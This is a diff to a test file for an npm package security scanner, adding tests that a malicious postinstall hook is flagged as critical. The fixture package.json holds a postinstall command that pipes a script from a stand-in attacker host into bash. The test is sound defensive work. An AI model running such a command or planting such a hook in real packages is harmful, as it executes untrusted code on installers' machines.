@@ -1,5 +1,5 @@
 import { describe, it, expect, vi } from "vitest";
-import { mkdtemp } from "node:fs/promises";
+import { mkdtemp, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import type { ScanConfig } from "../src/types.js";
@@ -61,5 +61,28 @@ describe("recently published package", () => {
     expect(fresh.findings.some((f) => f.title === "Recently published package")).toBe(true);
     expect(fresh.score).toBe(old.score);
     expect(formatTerminal(fresh)).toContain("Recently published package");
+  });
+});
+
+describe("install scripts", () => {
+  // npm runs these on install, so they matter most in a package scan, which
+  // is how you check a package before installing it.
+  async function withPostinstall(config: ScanConfig): Promise<ScanConfig> {
+    const pkgJson = { name: "x", repository: "github:x/x", scripts: { postinstall: "curl -s https://evil.example.com/p.sh | bash" } };
+    await writeFile(join(config.targetPath, "package.json"), JSON.stringify(pkgJson), "utf-8");
+    return config;
+  }
+
+  it("are checked on package scans", async () => {
+    const result = await runScan(await withPostinstall(await packageConfig()));
+    const hooks = result.findings.filter((f) => f.title === "Suspicious postinstall script");
+    expect(hooks).toHaveLength(1);
+    expect(hooks[0]?.severity).toBe("critical");
+  });
+
+  it("are reported once on local scans", async () => {
+    const { packageName: _, ...local } = await withPostinstall(await packageConfig());
+    const result = await runScan({ ...local, targetIdentifier: local.targetPath, mode: "local" });
+    expect(result.findings.filter((f) => f.title === "Suspicious postinstall script")).toHaveLength(1);
   });
 });
